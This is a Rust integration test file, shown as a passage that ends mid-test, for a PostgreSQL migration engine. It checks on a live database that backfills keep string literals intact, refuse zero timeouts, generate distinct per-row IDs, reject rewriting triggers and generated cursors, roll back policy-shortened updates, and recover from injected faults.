//! Resurrected live-Postgres regression scenarios.
//!
//! An earlier cut deleted the 42 `#![cfg(feature="native-pg")]` test files: they drove the
//! now-deleted native compio-postgres client directly, so they never compiled once the
//! native driver left the tree. Their SCENARIOS — the safety-critical shipped-path
//! coverage for applying against a REAL Postgres — return here, ADAPTED to drive the
//! SHIPPED generic `PostgresBackend<PgDevSession>` / `apply::<PgDevSession>` /
//! journal / drift / status path THROUGH the `driver::SqlSession` seam (the same seam
//! the production napi/Node `pg` host rides), using the TEST-ONLY [`PgDevSession`]
//! (blocking `postgres` crate, `[dev-dependency]` only). This is the in-crate live-DB
//! coverage for the shipped path.
//!
//! Scenarios covered here (the critical shipped-path list):
//!   * two-phase apply + `pg_advisory_lock` (transactional + non-transactional paths);
//!   * journal ensure / record / read / recovery (crash between `started` and
//!     `completed`);
//!   * checksum + drift detection (tamper of an applied checksum);
//!   * declarative deploy (desired-vs-live diff → DDL);
//!   * concurrency / lock contention (a second session blocks on the project lock);
//!   * rollback (`down` runs, `rolled_back` event appends, re-apply works);
//!   * baseline / adopt (record `completed` WITHOUT running `up`).
//!
//! GATED behind `ZERO_MIGRATE_TEST_PG_URL`: every test skips cleanly when unset, so a
//! contributor without a database still gets a green run. The skip announces itself and
//! `ZERO_MIGRATE_REQUIRE_LIVE_DB=1` turns it into a failure, which is what CI sets. The
//! DSN itself is NOT repeated here - `docker-compose.test.yml` carries the canonical
//! value in its own header, and the port this comment used to name was a third value
//! that no longer serves anything. Each test runs in its OWN meta + project
//! schema (suffixed by a unique token) so the shared DB stays clean and re-runs are
//! independent.

mod support;

use std::collections::{BTreeMap, BTreeSet};

use support::PgDevSession;

use zero_migrate::apply::backend::MigrationBackend;
use zero_migrate::model::migration::Checksum;
use zero_migrate::{
    apply, check_checksum_drift, ensure_journal, history, resolve_create_table_policy,
    snapshot_schema, status, ApplyError, Approval, ApprovalScope, BackfillSpec, BindValue,
    DeclarativeApplyError, EngineError, ExecutorConfig, ExpandContractAuthor, GuardConfig,
    IrAuthor, LiveSchema, LockMode, Migration, MigrationEngine, MigrationFlags, MigrationId,
    MigrationIr, OnlineIntent, PlanStep, PostgresBackend, RenameStep, Resolution, SqlDialect,
};

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

/// A unique token so each test gets isolated meta + project schemas in the shared DB.
fn token() -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    static N: AtomicU64 = AtomicU64::new(0);
    let n = N.fetch_add(1, Ordering::SeqCst);
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    format!("{pid}_{nanos}_{n}")
}

fn cfg_for(tok: &str) -> ExecutorConfig {
    let mut c = ExecutorConfig::new(
        format!("prj_{tok}"),
        format!("proj_{tok}"),
        support::no_inject(&format!("proj_{tok}")),
    );
    c.pg.meta_schema = format!("meta_{tok}");
    c
}

/// Create the project schema the migrations will populate (the platform provisions
/// this at project creation; tests do it explicitly).
async fn ensure_project_schema(session: &PgDevSession, cfg: &ExecutorConfig) {
    use zero_migrate::driver::SqlSession;
    session
        .batch(&format!(
            "CREATE SCHEMA IF NOT EXISTS \"{}\"",
            cfg.project_schema
        ))
        .await
        .expect("create project schema");
}

async fn drop_schemas(session: &PgDevSession, cfg: &ExecutorConfig) {
    use zero_migrate::driver::SqlSession;
    let _ = session
        .batch(&format!(
            "DROP SCHEMA IF EXISTS \"{}\" CASCADE; DROP SCHEMA IF EXISTS \"{}\" CASCADE;",
            cfg.project_schema, cfg.pg.meta_schema
        ))
        .await;
}

/// A transactional migration with a correct checksum.
fn mig(version: MigrationId, name: &str, up: &str) -> Migration {
    Migration {
        version,
        name: name.to_string(),
        up: up.to_string(),
        down: None,
        checksum: Checksum::of(&zero_migrate::ChecksumInput {
            up,
            down: None,
            flags: &MigrationFlags::default(),
            owner_app: "app_test",
            depends_on: &[],
            supersedes: &[],
            preconditions: &[],
        }),
        flags: MigrationFlags::default(),
        owner_app: "app_test".to_string(),
        depends_on: Vec::new(),
        supersedes: Vec::new(),
        preconditions: Vec::new(),
        existence_guard: None,
    }
}

/// A transactional migration with a `down` (for rollback).
fn mig_with_down(version: MigrationId, name: &str, up: &str, down: &str) -> Migration {
    let mut m = mig(version, name, up);
    m.down = Some(down.to_string());
    m.checksum = Checksum::of(&zero_migrate::ChecksumInput {
        up,
        down: Some(down),
        flags: &MigrationFlags::default(),
        owner_app: "app_test",
        depends_on: &[],
        supersedes: &[],
        preconditions: &[],
    });
    m
}

/// A non-transactional migration (the two-phase path).
fn mig_nontxn(version: MigrationId, name: &str, up: &str) -> Migration {
    let mut m = mig(version, name, up);
    m.flags.transactional = false;
    m.checksum = Checksum::of(&zero_migrate::ChecksumInput {
        up,
        down: None,
        flags: &m.flags,
        owner_app: "app_test",
        depends_on: &[],
        supersedes: &[],
        preconditions: &[],
    });
    m
}

/// Does `schema.table` exist?
async fn table_exists(session: &PgDevSession, schema: &str, table: &str) -> bool {
    use zero_migrate::driver::SqlSession;
    let row = session
        .query_one(
            "SELECT EXISTS (SELECT 1 FROM information_schema.tables \
             WHERE table_schema = $1 AND table_name = $2) AS present",
            &[schema.into(), table.into()],
        )
        .await
        .expect("table_exists probe");
    row.try_get::<_, bool>("present").expect("decode present")
}

async fn column_exists(session: &PgDevSession, schema: &str, table: &str, column: &str) -> bool {
    use zero_migrate::driver::SqlSession;
    let row = session
        .query_one(
            "SELECT EXISTS (SELECT 1 FROM information_schema.columns \
             WHERE table_schema = $1 AND table_name = $2 AND column_name = $3) AS present",
            &[schema.into(), table.into(), column.into()],
        )
        .await
        .expect("column existence query");
    row.try_get("present").expect("present bool")
}

fn step_checksum(label: &str) -> Checksum {
    Checksum::of(&zero_migrate::ChecksumInput {
        up: label,
        down: None,
        flags: &MigrationFlags::default(),
        owner_app: "app_test",
        depends_on: &[],
        supersedes: &[],
        preconditions: &[],
    })
}

fn legacy_abort_resolution_version(pending_version: &str, ordinal: usize) -> MigrationId {
    let mut seed = pending_version.as_bytes().to_vec();
    seed.extend_from_slice(&(ordinal as u64).to_be_bytes());
    MigrationId::derive("resolve_pending_abort", &seed)
}

fn assert_per_row_uuid(value: &str, version: u8) {
    let bytes = value.as_bytes();
    assert_eq!(bytes.len(), 36, "canonical UUID length: {value}");
    for separator in [8, 13, 18, 23] {
        assert_eq!(bytes[separator], b'-', "canonical UUID separators: {value}");
    }
    assert_eq!(bytes[14], b'0' + version, "UUID version {version}: {value}");
    assert!(
        matches!(bytes[19], b'8' | b'9' | b'a' | b'b'),
        "RFC UUID variant: {value}"
    );
    assert_eq!(value, value.to_ascii_lowercase(), "UUID must be lowercase");
    assert!(
        bytes.iter().enumerate().all(|(index, byte)| {
            matches!(index, 8 | 13 | 18 | 23)
                || byte.is_ascii_digit()
                || matches!(byte, b'a'..=b'f')
        }),
        "UUID must contain canonical lowercase hexadecimal: {value}"
    );
}

fn decode_per_row_crockford(value: &str, uppercase: bool) -> u128 {
    let alphabet = if uppercase {
        b"0123456789ABCDEFGHJKMNPQRSTVWXYZ".as_slice()
    } else {
        b"0123456789abcdefghjkmnpqrstvwxyz".as_slice()
    };
    let bytes = value.as_bytes();
    assert_eq!(bytes.len(), 26, "canonical Crockford length: {value}");
    let decode = |byte: u8| {
        alphabet
            .iter()
            .position(|candidate| *candidate == byte)
            .map(|index| index as u8)
            .unwrap_or_else(|| panic!("invalid Crockford character in {value}"))
    };
    let first = decode(bytes[0]);
    assert!(
        first <= 7,
        "128-bit Crockford value must begin at most 7: {value}"
    );
    bytes[1..].iter().fold(first as u128, |decoded, byte| {
        (decoded << 5) | u128::from(decode(*byte))
    })
}

fn assert_per_row_type_id(value: &str, prefix: &str) {
    let suffix = value
        .strip_prefix(&format!("{prefix}_"))
        .unwrap_or_else(|| panic!("TypeID must preserve prefix {prefix:?}: {value}"));
    let decoded = decode_per_row_crockford(suffix, false).to_be_bytes();
    assert_eq!(
        decoded[6] >> 4,
        7,
        "TypeID suffix must encode UUIDv7: {value}"
    );
    assert_eq!(decoded[8] & 0xc0, 0x80, "TypeID UUID variant: {value}");
}

fn assert_per_row_ulid(value: &str) {
    let _ = decode_per_row_crockford(value, true);
}

async fn standard_conforming_strings(session: &PgDevSession) -> String {
    use zero_migrate::driver::SqlSession;
    session
        .query_one("SHOW standard_conforming_strings", &[])
        .await
        .expect("read standard_conforming_strings")
        .try_get(0)
        .expect("decode standard_conforming_strings")
}

#[compio::test]
async fn structured_data_steps_pin_standard_strings_and_restore_the_session() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".literal_safety (\
                id bigint PRIMARY KEY, value text NOT NULL\
            )",
            cfg.project_schema
        ))
        .await
        .expect("create literal safety table");
    session
        .batch("SET standard_conforming_strings = off")
        .await
        .expect("set hostile inherited string mode");
    assert_eq!(standard_conforming_strings(&session).await, "off");

    let dml_version = MigrationId::generate();
    let dml_checksum = step_checksum("standard string DML");
    let dml = format!(
        r#"INSERT INTO "{}".literal_safety (id, value) VALUES ($1, '\n'), ($2, 'seed')"#,
        cfg.project_schema
    );
    backend
        .run_dml_step(
            &cfg,
            &dml_version,
            &dml_checksum,
            "insert literal safety rows",
            &dml,
            &[BindValue::Int(1), BindValue::Int(2)],
            &cfg.project_schema,
            "literal_safety",
            None,
            true,
            false,
            "app_test",
            Approval::None,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect("structured DML applies with standard strings");
    let inserted: String = session
        .query_one(
            &format!(
                "SELECT value FROM \"{}\".literal_safety WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read DML literal")
        .try_get("value")
        .expect("decode DML literal");
    assert_eq!(inserted, r"\n", "backslash must remain ordinary text");
    assert_eq!(
        standard_conforming_strings(&session).await,
        "off",
        "DML commit must restore the inherited session value"
    );

    let backfill_version = MigrationId::generate();
    let backfill_checksum = step_checksum("standard string backfill");
    let backfill = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "literal_safety".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 10,
        set_clause: r#""value" = '\t'"#.into(),
        per_row: BTreeMap::new(),
        filter: Some(r#""id" = 2"#.into()),
        name: "backfill literal safety".into(),
    };
    backend
        .run_backfill_step(
            &cfg,
            &backfill_version,
            &backfill_checksum,
            &backfill,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect("backfill applies with standard strings");
    let backfilled: String = session
        .query_one(
            &format!(
                "SELECT value FROM \"{}\".literal_safety WHERE id = 2",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read backfill literal")
        .try_get("value")
        .expect("decode backfill literal");
    assert_eq!(backfilled, r"\t", "backslash must remain ordinary text");
    assert_eq!(
        standard_conforming_strings(&session).await,
        "off",
        "backfill commit must restore the inherited session value"
    );

    drop_schemas(&session, &cfg).await;
}

/// The backfill session render refuses a timeout budget that resolves to zero,
/// which PostgreSQL reads as "no limit" rather than as a tight budget.
///
/// The zero here comes from the executor configuration rather than from a
/// migration flag: `ExecutorConfig::statement_timeout_ms` is `Duration::as_millis`,
/// so a sub-millisecond duration truncates to zero whole milliseconds. That is a
/// budget no IR load gate can see, because no IR is involved.
///
/// The finite control is the same table, the same spec and the same call one line
/// down, differing only in the budget, so a refusal here means the budget caused it
/// and not the fixture.
#[compio::test]
async fn a_backfill_refuses_a_config_timeout_that_truncates_to_zero() {
    use std::time::Duration;
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{schema}\".zero_budget (\
                id bigint PRIMARY KEY, value text NOT NULL\
            ); \
             INSERT INTO \"{schema}\".zero_budget (id, value) VALUES (1, 'seed')",
            schema = cfg.project_schema
        ))
        .await
        .expect("create zero-budget backfill target");

    let spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "zero_budget".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 10,
        set_clause: r#""value" = 'filled'"#.into(),
        per_row: BTreeMap::new(),
        filter: None,
        name: "fill zero budget".into(),
    };

    let mut zero_cfg = cfg.clone();
    zero_cfg.pg.statement_timeout = Duration::from_micros(500);
    assert_eq!(
        zero_cfg.statement_timeout_ms(),
        0,
        "a sub-millisecond duration must be the zero the render would emit"
    );
    let refused_version = MigrationId::generate();
    let refused_checksum = step_checksum("zero budget backfill");
    let err = backend
        .run_backfill_step(
            &zero_cfg,
            &refused_version,
            &refused_checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("a backfill that would run with statement_timeout = 0 must be refused");
    assert!(
        matches!(err, ApplyError::IndefiniteTimeout(_)),
        "the refusal must name the indefinite budget: {err:?}"
    );
    let untouched: String = session
        .query_one(
            &format!(
                "SELECT value FROM \"{}\".zero_budget WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read refused backfill target")
        .try_get("value")
        .expect("decode refused backfill target");
    assert_eq!(
        untouched, "seed",
        "the refusal must land before any row is written"
    );

    let finite_version = MigrationId::generate();
    let finite_checksum = step_checksum("finite budget backfill");
    backend
        .run_backfill_step(
            &cfg,
            &finite_version,
            &finite_checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect("the same backfill applies under a finite budget");
    let filled: String = session
        .query_one(
            &format!(
                "SELECT value FROM \"{}\".zero_budget WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read finite backfill target")
        .try_get("value")
        .expect("decode finite backfill target");
    assert_eq!(filled, "filled", "the finite control must write the row");

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn per_row_backfill_generates_fresh_exact_values_on_live_postgres() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    let authored: MigrationIr = serde_json::from_str(
        r#"{"ir_version":1,"name":"pg_per_row_generators","ops":[
          {"op":"createTable","name":"samples","columns":[
            {"name":"id","type":"bigInt","nullable":false},
            {"name":"uuid4","type":"uuid"},
            {"name":"uuid7","type":"uuid"},
            {"name":"type_id","type":"text","valueFormat":{"typeId":{"prefix":"order"}}},
            {"name":"ulid","type":"text","valueFormat":"ulid"},
            {"name":"plain_text","type":"text"}
          ],"primaryKey":["id"]},
          {"op":"insert","table":"samples","columns":["id"],
           "rows":[[1],[2],[3],[4],[5],[6],[7],[8]]},
          {"op":"backfill","table":"samples","name":"fill_per_row_ids",
           "cursorColumns":["id"],"cursorStability":{"mode":"guardUpdates"},"batchSize":2,"set":{
             "uuid4":{"perRow":"uuidV4"},
             "uuid7":{"perRow":"uuidV7"},
             "type_id":{"perRow":{"typeId":{"prefix":"order"}}},
             "ulid":{"perRow":"ulid"}
           }}
        ]}"#,
    )
    .expect("parse per-row IR fixture");
    let resolved =
        resolve_create_table_policy(&authored, &support::no_inject("app"), &cfg.project_schema)
            .expect("resolve no-inject table policy");
    let ir = serde_json::to_string(&resolved).expect("serialize resolved per-row IR");
    let author = IrAuthor::new(
        &cfg.project_schema,
        "app_test",
        SqlDialect::Postgres,
        &support::no_inject("app"),
    );
    let artifact = author
        .load_and_lower_guarded(
            &ir,
            "app_test",
            &BTreeMap::new(),
            &LiveSchema::default(),
            &GuardConfig::from_policy(
                support::no_inject(&cfg.project_schema),
                SqlDialect::Postgres,
            ),
        )
        .expect("declared perRow destination formats must lower on PostgreSQL");
    MigrationEngine::new()
        .apply_plan(
            &artifact.plan.steps,
            Approval::Approved,
            &backend,
            &cfg,
            "postgres-per-row-generator-test",
            LockMode::Acquire,
        )
        .await
        .expect("per-row generators apply on live PostgreSQL through the IR plan");

    let rows = session
        .query(
            &format!(
                "SELECT uuid4::text AS uuid4, uuid7::text AS uuid7, type_id, ulid \
                 FROM \"{}\".samples ORDER BY id",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read generated values");
    assert_eq!(rows.len(), 8);
    let mut distinct = [
        BTreeSet::new(),
        BTreeSet::new(),
        BTreeSet::new(),
        BTreeSet::new(),
    ];
    for row in &rows {
        let uuid4: String = row.try_get("uuid4").expect("decode UUIDv4");
        let uuid7: String = row.try_get("uuid7").expect("decode UUIDv7");
        let type_id: String = row.try_get("type_id").expect("decode TypeID");
        let ulid: String = row.try_get("ulid").expect("decode ULID");
        assert_per_row_uuid(&uuid4, 4);
        assert_per_row_uuid(&uuid7, 7);
        assert_per_row_type_id(&type_id, "order");
        assert_per_row_ulid(&ulid);
        distinct[0].insert(uuid4);
        distinct[1].insert(uuid7);
        distinct[2].insert(type_id);
        distinct[3].insert(ulid);
    }
    for values in distinct {
        assert_eq!(
            values.len(),
            rows.len(),
            "an apply-engine generator must never reuse one build-time or batch literal"
        );
    }

    let mut logical_live = LiveSchema::default();
    logical_live.tables.insert("samples".into());
    logical_live
        .advance_logical_columns(&resolved, SqlDialect::Postgres, &cfg.project_schema, None)
        .expect("the applied artifact seeds its declared logical column contracts");
    let invalid_backfill: MigrationIr = serde_json::from_str(
        r#"{"ir_version":1,"name":"reject_generic_text_per_row","ops":[
          {"op":"backfill","table":"samples","name":"reject_plain_text_type_id",
           "cursorColumns":["id"],"cursorStability":{"mode":"guardUpdates"},"batchSize":2,"set":{
             "plain_text":{"perRow":{"typeId":{"prefix":"order"}}}
           }}
        ]}"#,
    )
    .expect("parse generic-text rejection fixture");
    let error = author
        .lower_steps(&invalid_backfill, &logical_live)
        .expect_err("generic text must not acquire a TypeID contract by inference");
    assert!(
        error
            .to_string()
            .contains("generic text with no value-format contract"),
        "unexpected generic-text validation error: {error}"
    );
    let changed_plain_text: i64 = session
        .query_one(
            &format!(
                "SELECT count(*) AS changed FROM \"{}\".samples WHERE plain_text IS NOT NULL",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("verify rejected generator changed no rows")
        .try_get("changed")
        .expect("decode unchanged-row count");
    assert_eq!(
        changed_plain_text, 0,
        "destination-family rejection must happen before the first row change"
    );

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn backfill_rejects_a_before_update_trigger_that_rewrites_values() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{schema}\".items (\
                 id bigint PRIMARY KEY, value text NOT NULL\
             ); \
             INSERT INTO \"{schema}\".items (id, value) \
             VALUES (1, 'pending'), (2, 'pending'), (3, 'pending'); \
             CREATE FUNCTION \"{schema}\".rewrite_value() RETURNS trigger \
             LANGUAGE plpgsql AS $$ \
             BEGIN \
                 NEW.value := OLD.value; \
                 RETURN NEW; \
             END \
             $$; \
             CREATE TRIGGER rewrite_value \
             BEFORE UPDATE ON \"{schema}\".items \
             FOR EACH ROW EXECUTE FUNCTION \"{schema}\".rewrite_value()",
            schema = cfg.project_schema
        ))
        .await
        .expect("create trigger-backed backfill target");

    let version = MigrationId::generate();
    let checksum = step_checksum("trigger rewrite backfill");
    let spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "items".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 10,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: None,
        name: "trigger rewrite backfill".into(),
    };

    let error = backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("a backfill target with an enabled user trigger must be rejected");
    assert!(
        error.to_string().contains("enabled user trigger"),
        "the failure should explain the trigger-free target requirement: {error}"
    );

    let rows = session
        .query(
            &format!(
                "SELECT value FROM \"{}\".items ORDER BY id",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read rolled-back target rows");
    let values = rows
        .iter()
        .map(|row| row.try_get::<_, String>("value").expect("decode value"))
        .collect::<Vec<_>>();
    assert_eq!(
        values,
        ["pending", "pending", "pending"],
        "trigger validation must happen before any target row is changed"
    );

    let progress_rows: i64 = session
        .query_one(
            &format!(
                "SELECT count(*) AS progress_rows FROM \"{}\".schema_backfills \
                 WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[version.as_str().into()],
        )
        .await
        .expect("read failed backfill progress")
        .try_get("progress_rows")
        .expect("decode progress count");
    assert_eq!(
        progress_rows, 0,
        "a rejected target must not create progress"
    );

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn backfill_rejects_a_stored_generated_unique_cursor_before_guard_or_cohort() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{schema}\".generated_cursor_items (\
                 source_key bigint NOT NULL, \
                 cursor_key bigint GENERATED ALWAYS AS (source_key * 2) STORED NOT NULL UNIQUE, \
                 value text NOT NULL\
             ); \
             INSERT INTO \"{schema}\".generated_cursor_items (source_key, value) \
             VALUES (1, 'pending'), (2, 'pending')",
            schema = cfg.project_schema
        ))
        .await
        .expect("create generated-cursor backfill target");

    let version = MigrationId::generate();
    let checksum = step_checksum("stored generated cursor backfill");
    let spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "generated_cursor_items".into(),
        cursor_columns: vec!["cursor_key".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 10,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: None,
        name: "stored generated cursor backfill".into(),
    };

    let error = backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("a generated cursor component must be refused");
    assert!(
        error
            .to_string()
            .contains("cursor component \"cursor_key\" is generated"),
        "unexpected generated-cursor error: {error}"
    );

    let changed: i64 = session
        .query_one(
            &format!(
                "SELECT count(*)::bigint AS n FROM \"{}\".generated_cursor_items \
                  WHERE value <> 'pending'",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read generated-cursor target")
        .try_get("n")
        .expect("decode changed count");
    assert_eq!(changed, 0, "generated-cursor refusal precedes mutation");

    let guards: i64 = session
        .query_one(
            "SELECT count(*)::bigint AS n \
               FROM pg_catalog.pg_trigger t \
               JOIN pg_catalog.pg_class c ON c.oid = t.tgrelid \
               JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace \
              WHERE n.nspname = $1 AND c.relname = 'generated_cursor_items' \
                AND NOT t.tgisinternal",
            &[cfg.project_schema.as_str().into()],
        )
        .await
        .expect("inspect generated-cursor guards")
        .try_get("n")
        .expect("decode guard count");
    assert_eq!(guards, 0, "refusal precedes guard installation");

    let progress_rows: i64 = session
        .query_one(
            &format!(
                "SELECT count(*)::bigint AS n FROM \"{}\".schema_backfills \
                 WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[version.as_str().into()],
        )
        .await
        .expect("inspect generated-cursor progress")
        .try_get("n")
        .expect("decode progress count");
    assert_eq!(progress_rows, 0, "refusal precedes cohort capture");

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn backfill_rolls_back_when_update_policy_hides_a_selected_row() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let mut cfg = cfg_for(&tok);
    let role = format!("bf_role_{tok}");
    cfg.pg.migrator_role = Some(role.clone());
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE ROLE \"{role}\" NOLOGIN; \
             CREATE TABLE \"{schema}\".items (\
                 id bigint PRIMARY KEY, value text NOT NULL\
             ); \
             INSERT INTO \"{schema}\".items (id, value) \
             VALUES (1, 'pending'), (2, 'pending'), (3, 'pending'); \
             GRANT USAGE ON SCHEMA \"{schema}\" TO \"{role}\"; \
             GRANT SELECT, UPDATE ON \"{schema}\".items TO \"{role}\"; \
             ALTER TABLE \"{schema}\".items ENABLE ROW LEVEL SECURITY; \
             CREATE POLICY select_all ON \"{schema}\".items \
                 FOR SELECT TO \"{role}\" USING (true); \
             CREATE POLICY update_except_second ON \"{schema}\".items \
                 FOR UPDATE TO \"{role}\" USING (id <> 2) WITH CHECK (true)",
            schema = cfg.project_schema
        ))
        .await
        .expect("create row-policy-backed backfill target");

    let version = MigrationId::generate();
    let checksum = step_checksum("row policy suppression backfill");
    let spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "items".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 10,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: None,
        name: "row policy suppression backfill".into(),
    };

    let error = backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("an UPDATE policy must not silently shorten the batch");
    assert!(
        error.to_string().contains("selected 3 rows but updated 2"),
        "the failure should explain the unsafe short update: {error}"
    );

    let rows = session
        .query(
            &format!(
                "SELECT value FROM \"{}\".items ORDER BY id",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read rolled-back target rows");
    let values = rows
        .iter()
        .map(|row| row.try_get::<_, String>("value").expect("decode value"))
        .collect::<Vec<_>>();
    assert_eq!(
        values,
        ["pending", "pending", "pending"],
        "the policy-shortened UPDATE must roll back the whole batch"
    );

    let progress = session
        .query_one(
            &format!(
                "SELECT last_cursor::text AS last_cursor, complete FROM \"{}\".schema_backfills \
                 WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[version.as_str().into()],
        )
        .await
        .expect("read failed backfill progress");
    assert_eq!(
        progress
            .try_get::<_, Option<String>>("last_cursor")
            .expect("decode last cursor"),
        None
    );
    assert!(!progress
        .try_get::<_, bool>("complete")
        .expect("decode complete"));

    drop_schemas(&session, &cfg).await;
    session
        .batch(&format!("DROP ROLE \"{role}\""))
        .await
        .expect("drop backfill test role");
}

#[compio::test]
async fn composite_guard_backfill_survives_crash_and_cleans_up_after_resume() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{schema}\".guarded_items (\
                 tenant_id bigint NOT NULL, id text COLLATE \"C\" NOT NULL, \
                 value text NOT NULL, PRIMARY KEY (tenant_id, id)\
             ); \
             INSERT INTO \"{schema}\".guarded_items (tenant_id, id, value) VALUES \
                 (1, 'a', 'pending'), (1, 'b', 'pending'), \
                 (2, 'a', 'pending'), (2, 'b', 'pending')",
            schema = cfg.project_schema
        ))
        .await
        .expect("create composite backfill target");

    let version = MigrationId::generate();
    let checksum = step_checksum("composite guarded cursor backfill");
    let spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "guarded_items".into(),
        cursor_columns: vec!["tenant_id".into(), "id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 2,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: Some("\"value\" = 'pending'".into()),
        name: "composite guarded cursor backfill".into(),
    };

    zero_migrate::fault::arm(zero_migrate::fault::points::BACKFILL_MID_BATCHES, 0);
    let error = backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("fault after the first committed batch");
    assert!(
        error.to_string().contains("fault-injection"),
        "unexpected pre-fault failure: {error}"
    );

    let progress = session
        .query_one(
            &format!(
                "SELECT last_cursor::text AS last_cursor, end_cursor::text AS end_cursor, \
